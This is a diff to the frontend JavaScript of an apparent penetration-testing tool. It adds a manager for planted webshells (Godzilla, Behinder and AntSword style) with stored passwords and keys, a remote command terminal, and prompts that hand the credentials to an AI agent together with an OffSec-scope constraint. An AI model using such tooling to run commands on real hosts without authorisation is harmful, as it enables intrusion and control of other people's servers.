@@ -4,7 +4,7 @@ const WS = 'ws://127.0.0.1:8878'
 
 // ---- tab 切换 ----
 // ---- 面包屑标题：HermesPentBox / 面板 / 子页 ----
-const PANEL_NAMES = { flows: 'Proxy', sitemap: 'Site Map', vulns: 'Vulnerabilities', browser: 'Browser', term: 'SSH Terminal', settings: 'Settings' }
+const PANEL_NAMES = { flows: 'Proxy', sitemap: 'Site Map', vulns: 'Vulnerabilities', webshell: 'WebShell', browser: 'Browser', term: 'SSH Terminal', settings: 'Settings' }
 const FTAB_NAMES = { intercept: 'Intercept', http: 'HTTP History', repeater: 'Repeater', ws: 'WebSockets History' }
 function setAppTitle(panel) {
   const el = document.getElementById('appTitle')
@@ -24,6 +24,7 @@ document.querySelectorAll('nav button').forEach((btn) => {
     document.getElementById('aiChat').style.display = btn.dataset.panel === 'settings' ? 'none' : 'flex'
     setAppTitle(btn.dataset.panel)
     if (btn.dataset.panel === 'vulns') loadVulns()  // 切到漏洞面板时拉最新列表（Agent/外部可能已增改）
+    if (btn.dataset.panel === 'webshell') { loadWsList(); setTimeout(() => { try { wsTermFit.fit() } catch { /* 容器刚显示 */ } }, 100) }  // 切到 WebShell 面板时拉列表 + 终端自适应
     if (btn.dataset.panel === 'sitemap') {
       refreshSitemap()  // 切到 Site Map 拉全量构建树
       if (!smTimer) smTimer = setInterval(refreshSitemap, 2000)  // Site Map 激活时实时刷新（新流量自动进树）
@@ -50,6 +51,28 @@ document.getElementById('btnPickFirefox').onclick = () => launchPick('firefox')
 document.getElementById('btnPickCancel').onclick = () => { pick.style.display = 'none' }
 pick.onclick = (e) => { if (e.target === pick) pick.style.display = 'none' }  // 点遮罩关闭
 
+// 全局自定义提示弹窗（替代 window.alert：非阻塞，alert 会阻塞渲染进程导致页面假死）
+function showMsg(msg) {
+  const el = document.getElementById('globalModalMsg')
+  const box = document.getElementById('globalModal')
+  if (!el || !box) { alert(msg); return }
+  el.textContent = msg
+  box.style.display = 'flex'
+}
+document.getElementById('globalModalOk').onclick = () => { document.getElementById('globalModal').style.display = 'none' }
+document.getElementById('globalModal').addEventListener('click', (e) => { if (e.target === document.getElementById('globalModal')) document.getElementById('globalModal').style.display = 'none' })
+document.addEventListener('keydown', (e) => { if (e.key === 'Enter' && document.getElementById('globalModal').style.display === 'flex') document.getElementById('globalModal').style.display = 'none' })
+// 全局 toast（底部居中，3s 自动消失）
+let toastTimer = null
+function showToast(msg) {
+  const el = document.getElementById('globalToast')
+  if (!el) { alert(msg); return }
+  el.textContent = msg
+  el.style.display = 'block'
+  clearTimeout(toastTimer)
+  toastTimer = setTimeout(() => { el.style.display = 'none' }, 3000)
+}
+
 // ---- AI 对话框（左侧常驻；与本地 Hermes Agent 对话，后端 /api/chat 保持会话上下文） ----
 const aiMsgs = document.getElementById('aiChatMsgs')
 const aiInput = document.getElementById('aiChatInput')
@@ -62,15 +85,23 @@ const aiSelBar = document.getElementById('aiSelBar')
 function renderAiSelBar() {
   const n = selFlowIds.size
   const vn = selVulnIds.size
-  aiSelBar.style.display = (n || vn) ? 'flex' : 'none'
-  document.getElementById('aiSelCount').textContent = `已选中流量 ${n} 条${vn ? `，漏洞 ${vn} 条` : ''}`
+  const wn = wsSelSet.size
+  aiSelBar.style.display = (n || vn || wn) ? 'flex' : 'none'
+  const parts = []
+  if (n) parts.push(`已选中流量 ${n} 条`)
+  if (vn) parts.push(`已选中漏洞 ${vn} 条`)
+  if (wn) parts.push(`已选中 WebShell ${wn} 个`)
+  document.getElementById('aiSelCount').textContent = parts.join('，')
 }
 function clearAiSel() {
   selFlowIds.clear()
   lastSelFlowId = null
   selVulnIds.clear()
   lastSelVulnId = null
+  wsSelSet.clear()
+  lastWsSelId = null
   renderAiSelBar()
+  loadWsList()  // 刷新 WebShell 列表（清除选中高亮）
   document.querySelectorAll('#flowTable tr.sel').forEach((tr) => tr.classList.remove('sel'))
 }
 document.getElementById('aiSelClear').onclick = clearAiSel
@@ -84,6 +115,22 @@ function addAiMsg(role, text) {
   aiMsgs.appendChild(div)
   aiMsgs.scrollTop = aiMsgs.scrollHeight
   return div
+}
+// 测量 AI 消息气泡一行可容纳的等宽字符数（气泡 max-width 85% 容器 + padding，而非整个窗口）
+function aiLineWidth() {
+  try {
+    const span = document.createElement('span')
+    span.style.cssText = 'position:absolute;visibility:hidden;white-space:pre;font:12px/1.5 "Cascadia Code",Consolas,monospace'
+    span.textContent = 'X'.repeat(200)
+    document.body.appendChild(span)
+    const cw = span.getBoundingClientRect().width / 200
+    span.remove()
+    const box = document.getElementById('aiMsgs')
+    const avail = box ? box.clientWidth : 500
+    // AI 气泡：align-self:flex-start，max-width:85%，左右 padding 各 10px
+    const bubbleW = avail * 0.85 - 20
+    return Math.max(24, Math.floor(bubbleW / cw))
+  } catch { return 72 }
 }
 // 子 Agent 运行跟踪：主聊天"回复子 Agent"或子 Agent 沟通窗口发起后，等待 penetrate-done SSE 送达结果
 // key = slot → { show: (reply) => void }（展示回复 + 恢复 UI）
@@ -217,9 +264,24 @@ async function aiSend() {
       `【漏洞 ${i + 1}】名称：${v.name}\n等级：${LEVEL_LABEL[v.level] || v.level}\nURI：${v.uri || '-'}\n描述：${v.desc || '(无)'}\n利用信息：${v.exploit || '(无)'}\n\n原始请求包：\n${v.reqRaw || '(无)'}\n\n原始响应包：\n${v.resRaw || '(无)'}`)
     prompt = (prompt ? prompt + '\n\n' : '请分析以下选中的漏洞文档：\n\n') + vblocks.join('\n\n')
   }
+  // WebShell 多选：完整 webshell 信息（含真实密码/密钥，经 detail API 获取）→ 发给主 Agent（遵守 OffSec，不做敏感/破坏性操作）
+  const wsSelN = wsSelSet.size
+  if (wsSelN) {
+    const wsSelItems = wsItems.filter((x) => wsSelSet.has(x.id))
+    const fullWs = await Promise.all(wsSelItems.map((x) => fetch(`${API}/api/webshells/detail?id=${x.id}`).then((r) => r.json()).catch(() => null)))
+    const wsBlocks = fullWs.filter(Boolean).map((w, i) =>
+      `【WebShell ${i + 1}】\nid：${w.id}\n类型：${w.type || 'custom'}\n脚本：${w.script || ''}\nURL：${w.url || ''}\n密码：${w.password || ''}\n密钥：${w.key || ''}\n加密方式：${w.cryption || ''}\nPayload：${w.payload || ''}\n状态：${w.status || 'unknown'}\n备注：${w.remark || '(无)'}\n${wsConnInfo(w)}\n执行命令方式（推荐）：直接调用本应用已实现的 WebShell 命令接口——POST http://localhost:8877/api/webshells/exec ，body 为 {"id": ${w.id}, "command": "<要执行的命令>"}，返回 {"ok":true,"output":"命令输出"}。该接口已封装完整加密/握手协议，请优先使用它执行命令或读取主机信息，不要自行用 execute_code 重复实现加密协议（会因协议细节/密钥为空而失败）。${!w.key ? '注意：该 WebShell 密钥字段未填写，自行构造加密请求必然失败；务必使用上述应用 exec 接口（应用已保存连接配置）。' : ''}`)
+    const wsInfo = wsBlocks.join('\n\n')
+    const constraint = '\n\n（安全约束：你必须严格遵守 OffSec 规范，仅在授权范围内开展安全测试。严禁进行破坏性/敏感操作，例如删除服务器上原有的文件、格式化磁盘、篡改业务数据、造成服务中断等。若需操作文件，只允许新增/修改由本次测试产生的临时文件，并保持可还原。）'
+    prompt = (msg ? prompt + '\n\n' : '以下是选中的 WebShell 会话信息，请基于它们继续：\n\n') + wsInfo + constraint
+    wsSelSet.clear(); lastWsSelId = null
+  }
   aiInput.value = ''
+  // 输出格式约束：告知 Agent 每行可容纳字符数，按此宽度整理对齐/换行
+  const lineChars = aiLineWidth()
+  prompt = prompt + `\n\n（输出格式要求：当前输出窗口每行可容纳约 ${lineChars} 个等宽字符。请据此控制行宽：表格/对齐内容宽度不超过 ${lineChars} 字符，超宽行需换行或折行；保持整齐、等宽对齐，避免输出超宽被截断。）`
   // 聊天框显示："已选中流量 N 条"（不展开完整数据包）
-  addAiMsg('user', msg + (selN ? `\n（已选中流量 ${selN} 条）` : '') + (selVulnIds.size ? `\n（已选中漏洞 ${selVulnIds.size} 条）` : ''))
+  addAiMsg('user', msg + (selN ? `\n（已选中流量 ${selN} 条）` : '') + (selVulnIds.size ? `\n（已选中漏洞 ${selVulnIds.size} 条）` : '') + (wsSelN ? `\n（已发送 ${wsSelN} 个WebShell信息）` : ''))
   const think = addAiMsg('ai', '思考中…')
   if (aiBusy) return  // 已在生成中（并发保护：Enter 连发/重复点击不重复发起）
   aiBusy = true
@@ -244,7 +306,8 @@ async function aiSend() {
     const dec = new TextDecoder()
     let buf = ''
     let acc = ''
-    think.innerHTML = ''  // 清掉"思考中…"，后续 delta 追加渲染
+    let outEl = null  // 独立的消息输出元素（避免与"思考中/正在执行"状态交替覆盖导致横跳）
+    think.innerHTML = ''  // 清掉"思考中…"，think 仅作为状态区（思考中/正在执行）
     while (!aborted) {
       const { done, value } = await reader.read()
       if (done) break
@@ -259,34 +322,42 @@ async function aiSend() {
         if (f.type === 'delta' && f.text) {
           bumpActivity()
           acc += f.text
-          think.textContent = acc
+          if (!outEl) outEl = addAiMsg('ai', '')
+          outEl.textContent = acc
           aiMsgs.scrollTop = aiMsgs.scrollHeight
         } else if (f.type === 'sid') {
           if (f.sessionId) aiChatSid = f.sessionId
         } else if (f.type === 'tool') {
-          // Agent 正在执行工具：显示进度（区别于"思考中…"转圈）
+          // Agent 正在执行工具：状态区显示进度（不影响消息输出 outEl）
           bumpActivity()
           if (f.evType === 'tool.completed') {
-            think.textContent = acc || '思考中…'
+            think.textContent = acc ? '' : '思考中…'
           } else if (f.tool) {
             think.textContent = `⚙ 正在执行 ${f.tool}${f.preview ? ` · ${f.preview.slice(0, 40)}` : ''}…`
           }
           aiMsgs.scrollTop = aiMsgs.scrollHeight
         } else if (f.type === 'done') {
           bumpActivity()
-          if (f.reply) { acc = f.reply; think.textContent = acc }
+          if (f.reply) {
+            acc = f.reply
+            if (!outEl) outEl = addAiMsg('ai', '')
+            outEl.textContent = acc
+          }
           if (f.sessionId) aiChatSid = f.sessionId
         } else if (f.type === 'error') {
           bumpActivity()
           acc = `（对话失败：${f.error || '未知错误'}）`
-          think.textContent = acc
+          if (!outEl) outEl = addAiMsg('ai', '')
+          outEl.textContent = acc
         }
       }
     }
-    think.textContent = acc || '（无回复）'
+    // 收尾：有输出 → 移除状态元素；无输出 → 状态元素显示结果
+    if (outEl) think.remove()
+    else think.textContent = acc || '（无回复）'
   } catch (e) {
     // 用户 Stop：保留已生成内容；否则报通信失败
-    if (aborted) { think.textContent = acc || '（已停止）' }
+    if (aborted) { if (outEl) outEl.textContent = acc || '（已停止）'; else think.textContent = acc || '（已停止）' }
     else { think.remove(); addAiMsg('ai', '（与 Hermes 通信失败）') }
   } finally {
     clearInterval(thinkTimer)
@@ -1015,9 +1086,13 @@ async function loadVulns() {
     el.classList.add('vuln-item')
     vulnListEl.appendChild(el)
   }
-  // 默认选中第一条（最新漏洞）：进入面板且无选中时自动显示详情 + 高亮（curVulnId），但不进发送集（selVulnIds 空——Ctrl/Shift 明确选中才发 Agent）
-  if (!selVulnIds.size && (j.items || []).length) {
+  // 首次进入且从未查看过（curVulnId 为 null）时自动显示最新一条；用户已点选/查看的保留当前
+  if (!selVulnIds.size && curVulnId == null && (j.items || []).length) {
     showVuln(j.items[j.items.length - 1].id)
+  } else if (curVulnId != null && !j.items.some((x) => x.id === curVulnId)) {
+    // 当前查看的漏洞已被删除/不存在 → 重置为空状态
+    curVulnId = null
+    vulnDoc.innerHTML = '<p style="color:#66788a">从左侧选择漏洞，或点击 新建漏洞</p>'
   }
   vulnListEl.scrollTop = st
 }
@@ -1063,6 +1138,778 @@ document.getElementById('btnVulnDel').onclick = async () => {
   loadVulns()
 }
 loadVulns()
+// ---- WebShell 管理（列表 + 详情 + 命令执行；后端持久化 ~/.pentbox/webshells.json） ----
+const wsListEl = document.getElementById('wsList')
+const wsOut = document.getElementById('wsOut')
+let curWsId = null
+let wsItems = []
+// WebShell 多选（Ctrl/Shift）：选中的会话随消息发送给主 Agent
+const wsSelSet = new Set()
+let lastWsSelId = null
+async function loadWsList() {
+  const st = wsListEl.scrollTop
+  const j = await (await fetch(`${API}/api/webshells`)).json()
+  wsItems = j.items || []
+  wsListEl.innerHTML = ''
+  for (const w of wsItems) {
+    const el = document.createElement('div')
+    const active = curWsId === w.id
+    const selected = wsSelSet.has(w.id)
+    const host = hostOf(w.url || '') || '未知'
+    el.style.cssText = `padding:10px 12px;cursor:pointer;border:1px solid ${selected ? '#f7a35c' : active ? '#4fc3f7' : '#262c36'};border-radius:4px;background:${selected ? 'rgba(247,163,92,.1)' : active ? 'rgba(79,195,247,.08)' : 'transparent'};margin-bottom:6px`
+    el.innerHTML = `
+      <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:6px">
+        <span style="font-size:12px;font-weight:600;color:${selected ? '#f7a35c' : active ? '#4fc3f7' : '#d8e0ea'};overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(host)}</span>
+        <span style="flex-shrink:0;font-size:10px;color:${w.type === 'godzilla' ? '#f76b6b' : w.type === 'behinder' ? '#f0b35c' : '#8b98a8'};background:${(w.type === 'godzilla' ? '#f76b6b' : w.type === 'behinder' ? '#f0b35c' : '#8b98a8')}1a;border:1px solid ${(w.type === 'godzilla' ? '#f76b6b' : w.type === 'behinder' ? '#f0b35c' : '#8b98a8')}55;padding:0 5px;border-radius:3px">${w.type || 'custom'}</span>
+      </div>
+      <div style="margin-top:4px;font-size:11px;color:#8b98a8;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(w.url || '-')}</div>
+      <div style="margin-top:4px;font-size:10px;color:#66788a">${w.script || ''} · ${w.status === 'alive' ? '<span style="color:#5cd67a">● alive</span>' : w.status === 'dead' ? '<span style="color:#f76b6b">● dead</span>' : '<span style="color:#8b98a8">● unknown</span>'}</div>
+    `
+    el.onclick = (e) => {
+      if (e.ctrlKey || e.metaKey || e.shiftKey) {
+        // Ctrl/Shift 多选
+        if (e.shiftKey && lastWsSelId != null) {
+          const ids = wsItems.map((x) => x.id)
+          const a = ids.indexOf(lastWsSelId), b = ids.indexOf(w.id)
+          if (a >= 0 && b >= 0) { const [lo, hi] = a < b ? [a, b] : [b, a]; for (let i = lo; i <= hi; i++) wsSelSet.add(wsItems[i].id) }
+        } else {
+          if (wsSelSet.has(w.id)) wsSelSet.delete(w.id)
+          else wsSelSet.add(w.id)
+        }
+        lastWsSelId = w.id
+        renderAiSelBar()
+        loadWsList()
+      } else {
+        curWsId = w.id; wsSelSet.clear(); lastWsSelId = null; showWsDetail(w); renderAiSelBar(); loadWsList()
+      }
+    }
+    wsListEl.appendChild(el)
+  }
+  wsListEl.scrollTop = st
+  // 无选中会话：显示提示（隐藏选项卡+视图）；有选中：显示详情
+  const showNoSel = () => {
+    document.getElementById('wsDetail').style.display = 'none'
+    document.getElementById('wsNoSel').style.display = 'flex'
+  }
+  const showDetail = () => {
+    document.getElementById('wsDetail').style.display = 'flex'
+    document.getElementById('wsNoSel').style.display = 'none'
+  }
+  // 默认显示第一条
+  if (curWsId == null && wsItems.length) { curWsId = wsItems[0].id; showDetail(); showWsDetail(wsItems[0]) }
+  else if (curWsId != null) { const c = wsItems.find((x) => x.id === curWsId); if (c) { showDetail(); showWsDetail(c) } else { curWsId = null; showNoSel(); wsOut.innerHTML = '' } }
+  else showNoSel()
+  // 清理失效选中 + 更新选中状态栏（已选中流量 N 条，WebShell K 个）
+  for (const id of [...wsSelSet]) if (!wsItems.some((x) => x.id === id)) wsSelSet.delete(id)
+  renderAiSelBar()
+}
+function showWsDetail(w) {
+  document.getElementById('wsCurTitle').textContent = `${w.type || 'custom'} · ${w.url || ''}`
+  wsOut.innerHTML = `<div style="color:#66788a;font-size:11px">选择下方输入框执行命令，或点击 Ping 测试存活。</div>\n\n# ${esc(w.url || '')}\n`
+}
+// 新建/编辑弹窗（按类型动态显示字段）
+const wsModal = document.getElementById('wsModal')
+// 类型切换：显示对应字段组（每种类型仅一个脚本类型选择，与冰蝎/哥斯拉/蚁剑原版一致）
+function applyWsType(type) {
+  const gf = document.getElementById('wsGodzillaFields')
+  const bf = document.getElementById('wsBehinderFields')
+  const cuf = document.getElementById('wsCustomFields')
+  const cf = document.getElementById('wsCommonFields')
+  const title = document.getElementById('wsModalTitle')
+  // 字段组容器用 block（子 div 各自是 flex 行，避免 flex-direction 默认 row 导致字段横排成一行）
+  gf.style.display = type === 'godzilla' ? 'block' : 'none'
+  bf.style.display = type === 'behinder' ? 'block' : 'none'
+  cuf.style.display = (type === 'custom' || type === 'antsword') ? 'block' : 'none'
+  cf.style.display = 'block'
+  title.textContent = type === 'godzilla' ? '添加 WebShell · 哥斯拉' : type === 'behinder' ? '添加 WebShell · 冰蝎' : type === 'antsword' ? '添加 WebShell · 蚁剑' : '添加 WebShell · 自定义'
+}
+// 哥斯拉：脚本类型 → Payload → 加密方式（完全参考原版 ApplicationContext：payload 决定加密列表）
+const GODZILLA_SCRIPT_PAYLOAD = {
+  php: 'PhpDynamicPayload',
+  jsp: 'JavaDynamicPayload',
+  jspx: 'JavaDynamicPayload',
+  aspx: 'CShapDynamicPayload',
+  asp: 'AspDynamicPayload',
+}
+// payload → 支持的加密方式（原版 getAllCryption(payload)，来自 cryptions 目录 + CryptionAnnotation）
+const GODZILLA_PAYLOAD_CRYPTIONS = {
+  'PhpDynamicPayload': [
+    ['PHP XOR Base64', 'PHP_XOR_BASE64'],
+    ['PHP XOR Raw', 'PHP_XOR_RAW'],
+    ['PHP EVAL XOR Base64', 'PHP_EVAL_XOR_BASE64'],
+  ],
+  'JavaDynamicPayload': [
+    ['JAVA AES Base64', 'JAVA_AES_BASE64'],
+    ['JAVA AES Raw', 'JAVA_AES_RAW'],
+    ['JAVA AES Weblogic', 'JAVA_AES_WEBLOGIC'],
+  ],
+  'CShapDynamicPayload': [
+    ['CSHAP AES Base64', 'CSHAP_AES_BASE64'],
+    ['CSHAP AES Raw', 'CSHAP_AES_RAW'],
+    ['CSHAP ASMX AES Base64', 'CSHAP_ASMX_AES_BASE64'],
+    ['CSHAP EVAL AES Base64', 'CSHAP_EVAL_AES_BASE64'],
+  ],
+  'AspDynamicPayload': [
+    ['ASP XOR Base64', 'ASP_XOR_BASE64'],
+    ['ASP XOR Raw', 'ASP_XOR_RAW'],
+    ['ASP Base64', 'ASP_BASE64'],
+    ['ASP Raw', 'ASP_RAW'],
+    ['ASP EVAL Base64', 'ASP_EVAL_BASE64'],
+  ],
+}
+function applyGodzillaScript(script) {
+  const payload = GODZILLA_SCRIPT_PAYLOAD[script] || 'PhpDynamicPayload'
+  // 重建 Payload 下拉：只保留当前脚本对应的 payload（选 jsp 时列表里只有 JavaDynamicPayload）
+  const pl = document.getElementById('wsPayload')
+  pl.innerHTML = ''
+  pl.appendChild(new Option(payload, payload))
+  pl.value = payload
+  // 重建加密下拉：只显示该 payload 支持的加密方式（原版 getAllCryption）
+  const cryptions = GODZILLA_PAYLOAD_CRYPTIONS[payload] || []
+  const crySel = document.getElementById('wsCryption')
+  const cur = crySel.value
+  const keep = cryptions.some(([, v]) => v === cur) ? cur : (cryptions[0]?.[1] || '')
+  crySel.innerHTML = ''
+  crySel.appendChild(new Option('自动', ''))
+  for (const [name, val] of cryptions) crySel.appendChild(new Option(name, val))
+  crySel.value = keep
+}
+document.getElementById('wsScript').addEventListener('change', (e) => applyGodzillaScript(e.target.value))
+document.getElementById('wsType').addEventListener('change', (e) => applyWsType(e.target.value))
+document.getElementById('btnWsNew').onclick = () => {
+  document.getElementById('wsType').value = 'godzilla'
+  document.getElementById('wsScript').value = 'php'
+  document.getElementById('wsScript2').value = 'php'
+  document.getElementById('wsScriptCustom').value = 'php'
+  document.getElementById('wsUrl').value = ''
+  document.getElementById('wsPass').value = ''
+  document.getElementById('wsKey').value = ''
+  document.getElementById('wsCryption').value = ''
+  document.getElementById('wsEncoding').value = 'UTF-8'
+  document.getElementById('wsPayload').value = 'PhpDynamicPayload'
+  document.getElementById('wsProtocol').value = 'aes'
+  document.getElementById('wsConnTimeout').value = '3000'
+  document.getElementById('wsReadTimeout').value = '60000'
+  document.getElementById('wsRemark').value = ''
+  document.getElementById('wsHeaders').value = ''
+  delete wsModal.dataset.editId
+  applyGodzillaScript('php')
+  applyWsType('godzilla')
+  clearWsError()
+  wsModal.style.display = 'flex'
+  document.getElementById('wsUrl').focus()
+}
+document.getElementById('btnWsEdit').onclick = () => {
+  if (curWsId == null) return
+  const w = wsItems.find((x) => x.id === curWsId)
+  if (!w) return
+  document.getElementById('wsType').value = w.type || 'custom'
+  document.getElementById('wsScript').value = w.script || 'php'
+  document.getElementById('wsScript2').value = w.script || 'php'
+  document.getElementById('wsScriptCustom').value = w.script || 'php'
+  document.getElementById('wsUrl').value = w.url || ''
+  document.getElementById('wsPass').value = w.password || ''
+  document.getElementById('wsKey').value = w.key || ''
+  document.getElementById('wsCryption').value = w.cryption || ''
+  document.getElementById('wsEncoding').value = w.encoding || 'UTF-8'
+  document.getElementById('wsPayload').value = w.payload || 'PhpDynamicPayload'
+  document.getElementById('wsProtocol').value = (w.cryption && w.cryption.includes('xor')) ? w.cryption : 'aes'
+  document.getElementById('wsConnTimeout').value = w.connTimeout || 3000
+  document.getElementById('wsReadTimeout').value = w.readTimeout || 60000
+  document.getElementById('wsRemark').value = w.remark || ''
+  document.getElementById('wsHeaders').value = w.headers || ''
+  wsModal.dataset.editId = curWsId
+  applyGodzillaScript(w.script || 'php')
+  applyWsType(w.type || 'custom')
+  clearWsError()
+  wsModal.style.display = 'flex'
+}
+const closeWsModal = () => { wsModal.style.display = 'none' }
+document.getElementById('btnWsModalClose').onclick = closeWsModal
+document.getElementById('btnWsModalCancel').onclick = closeWsModal
+// 添加弹窗内联提示（避免原生 alert 阻塞交互导致页面假死）
+function showWsError(msg, isErr = true) {
+  const el = document.getElementById('wsModalError')
+  if (!el) { alert(msg); return }
+  el.textContent = msg
+  el.style.color = isErr ? '#f76b6b' : '#5cd67a'
+  el.style.display = 'block'
+}
+function clearWsError() {
+  const el = document.getElementById('wsModalError')
+  if (el) { el.textContent = ''; el.style.display = 'none' }
+}
+// 从添加弹窗读取表单参数（保存 / 测试连接共用）
+function getWsFormBody() {
+  const type = document.getElementById('wsType').value
+  return {
+    type,
+    script: type === 'godzilla' ? document.getElementById('wsScript').value
+          : type === 'behinder' ? document.getElementById('wsScript2').value
+          : document.getElementById('wsScriptCustom').value,
+    url: document.getElementById('wsUrl').value.trim(),
+    password: document.getElementById('wsPass').value.trim(),
+    key: (type === 'godzilla' ? document.getElementById('wsKey').value : '').trim(),
+    cryption: type === 'godzilla' ? document.getElementById('wsCryption').value
+            : type === 'behinder' ? document.getElementById('wsProtocol').value
+            : '',
+    encoding: document.getElementById('wsEncoding').value,
+    payload: type === 'godzilla' ? document.getElementById('wsPayload').value : '',
+    connTimeout: Number(document.getElementById('wsConnTimeout').value) || 3000,
+    readTimeout: Number(document.getElementById('wsReadTimeout').value) || 60000,
+    remark: document.getElementById('wsRemark').value.trim(),
+    headers: document.getElementById('wsHeaders').value,
+  }
+}
+// 测试连接：用当前表单参数走存活校验（不保存），原版哥斯拉 test 协议
+document.getElementById('btnWsModalTest').onclick = async () => {
+  const body = getWsFormBody()
+  if (!body.url) { showMsg('URL 必填'); return }
+  clearWsError()
+  const btn = document.getElementById('btnWsModalTest')
+  const old = btn.textContent
+  btn.textContent = '测试中…'
+  btn.disabled = true
+  try {
+    const r = await fetch(`${API}/api/webshells/test`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }).then((x) => x.json())
+    if (r.alive) showMsg(`连接成功 ✓${r.detail ? '\n' + r.detail : ''}`)
+    else {
+      closeWsModal()  // 失败后关闭弹窗，避免遮罩残留；showMsg 非阻塞提示
+      showMsg(`连接失败 ✗\n${r.error || r.detail || '请检查 URL / 类型 / 脚本 / 密码 / 密钥 配置'}`)
+    }
+  } catch (e) { showMsg('测试失败: ' + e.message) } finally { btn.textContent = old; btn.disabled = false }
+}
+document.getElementById('btnWsModalSave').onclick = async () => {
+  const type = document.getElementById('wsType').value
+  // 各类型取对应字段（每种类型一个脚本类型选择，无重复）
+  const body = getWsFormBody()
+  if (!body.url) { showWsError('URL 必填'); return }
+  clearWsError()
+  const editId = wsModal.dataset.editId
+  // 保存前先过连接测试：不通过不添加（验证 URL/类型/脚本/密码/密钥 配置是否匹配目标）
+  const btn = document.getElementById('btnWsModalSave')
+  const oldTxt = btn.textContent
+  btn.textContent = '测试中…'
+  btn.disabled = true
+  let tr
+  try {
+    tr = await fetch(`${API}/api/webshells/test`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }).then((x) => x.json())
+  } catch (e) { tr = { alive: false, error: e.message } }
+  btn.textContent = oldTxt
+  btn.disabled = false
+  if (!tr.alive) {
+    // 关闭添加弹窗（backdrop 移除），再用非阻塞自定义弹窗提示（showMsg 不阻塞渲染，避免页面假死）
+    closeWsModal()
+    showMsg(`连接测试未通过，未添加。\n${tr.error || tr.detail || '请检查 URL / 类型 / 脚本 / 密码 / 密钥 配置'}`)
+    return
+  }
+  // 测试通过：立即关闭弹窗（避免保存请求期间 modal backdrop 覆盖全屏），再保存
+  closeWsModal()
+  try {
+    if (editId) {
+      const r = await fetch(`${API}/api/webshells/${editId}`, { method: 'PUT', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }).then((x) => x.json())
+      if (r.error) { wsModal.style.display = 'flex'; showWsError('保存失败：' + r.error); return }
+      curWsId = Number(editId)
+    } else {
+      const r = await fetch(`${API}/api/webshells`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }).then((x) => x.json())
+      if (r.error) { wsModal.style.display = 'flex'; showWsError('保存失败：' + r.error); return }
+      curWsId = r.id
+    }
+    loadWsList()
+  } catch (e) { wsModal.style.display = 'flex'; showWsError('保存失败: ' + e.message) }
+}
+document.getElementById('btnWsDel').onclick = async () => {
+  if (curWsId == null) return
+  if (!confirm('确认删除该 WebShell？')) return
+  await fetch(`${API}/api/webshells/${curWsId}`, { method: 'DELETE' })
+  curWsId = null
+  loadWsList()
+}
+// 命令执行 / Ping（经内置代理发出，流量可被面板捕获）
+// ---- 模拟终端（虚拟终端）：提示符 + 命令输入 + 输出（xterm.js），命令经 WebShell exec 执行 ----
+const wsTermFit = new FitAddon.FitAddon()
+const wsTerm = new Terminal({ cursorBlink: true, fontSize: 13, scrollback: 5000, rightClickSelectsWord: true, allowProposedApi: true, theme: { background: '#111418', foreground: '#d7dde4' } })
+wsTerm.loadAddon(wsTermFit)
+wsTerm.open(document.getElementById('wsTerm'))
+let wsTermLine = ''
+let wsTermBusy = false
+function wsTermPrompt() { wsTerm.write('\r\n# ') }
+function wsTermReset() { wsTermLine = ''; wsTermPrompt() }
+// 执行命令并输出（供 Enter / 粘贴多行复用）
+function wsTermClean(out) { return (out || '').replace(/\r\n/g, '\n').replace(/\r/g, '\n').replace(/\n/g, '\r\n') }
+function wsTermExec(cmd) {
+  if (wsTermBusy) return
+  wsTermBusy = true
+  wsTerm.write('\r\n')
+  wsExecRaw(cmd)
+    .then((out) => { wsTerm.write(wsTermClean(out || '(无输出)')); wsTermBusy = false; wsTermReset() })
+    .catch((e) => { wsTerm.write('\r\n[错误] ' + (e.message || e)); wsTermBusy = false; wsTermReset() })
+}
+// 复制（有选择时 Ctrl+C）+ 粘贴（Ctrl+V 读剪贴板）+ 右键复制
+wsTerm.attachCustomKeyEventHandler((e) => {
+  if (e.type !== 'keydown') return true
+  if (e.ctrlKey && (e.key === 'c' || e.key === 'C')) {
+    if (wsTerm.hasSelection()) { navigator.clipboard.writeText(wsTerm.getSelection()).catch(() => {}); return false }
+    return true
+  }
+  if (e.ctrlKey && (e.key === 'v' || e.key === 'V')) {
+    navigator.clipboard.readText().then((txt) => {
+      if (!txt) return
+      const lines = txt.replace(/\r\n/g, '\n').split('\n')
+      wsTerm.write(lines[0]); wsTermLine += lines[0]
+      for (let i = 1; i < lines.length; i++) {
+        const cmd = wsTermLine.trim()
+        wsTermLine = ''
+        if (cmd) wsTermExec(cmd)
+        else wsTermReset()
+        wsTerm.write(lines[i]); wsTermLine += lines[i]
+      }
+    }).catch(() => {})
+    return false
+  }
+  return true
+})
+wsTerm.element.addEventListener('contextmenu', (e) => {
+  if (wsTerm.hasSelection()) { e.preventDefault(); navigator.clipboard.writeText(wsTerm.getSelection()).catch(() => {}) }
+})
+
+function wsTermInit() {
+  wsTerm.clear()
+  wsTerm.write('\x1b[1;34mWebShell 虚拟终端\x1b[0m\r\nCtrl+C 复制选择内容 / Ctrl+V 粘贴，无选择时 Ctrl+C 清空输入\r\n')
+  wsTermReset()
+}
+wsTerm.onData((data) => {
+  if (wsTermBusy) return
+  for (const ch of data) {
+    if (ch === '\r') {
+      const cmd = wsTermLine.trim()
+      wsTermLine = ''
+      if (!cmd) { wsTermReset(); continue }
+      wsTermExec(cmd)
+      return
+    } else if (ch === '\u007f' || ch === '\b') {
+      if (wsTermLine.length) { wsTermLine = wsTermLine.slice(0, -1); wsTerm.write('\b \b') }
+    } else if (ch === '\x03') {
+      wsTermLine = ''
+      wsTerm.write('^C')
+      wsTermReset()
+    } else if (ch >= ' ') {
+      wsTermLine += ch
+      wsTerm.write(ch)
+    }
+  }
+})
+wsTermInit()
+window.__wsTerm = wsTerm
+// 终端自适应：窗口/容器尺寸变化时重新 fit（列数/行数跟随）
+window.addEventListener('resize', () => { setTimeout(() => { try { wsTermFit.fit() } catch { /* 容器不可见 */ } }, 60) })
+if (typeof ResizeObserver !== 'undefined') {
+  new ResizeObserver(() => { try { wsTermFit.fit() } catch { /* 容器不可见 */ } }).observe(document.getElementById('wsTerm'))
+}
+
+// ---- WebShell 详情选项卡（虚拟终端 / 文件管理），风格同 HTTP History ----
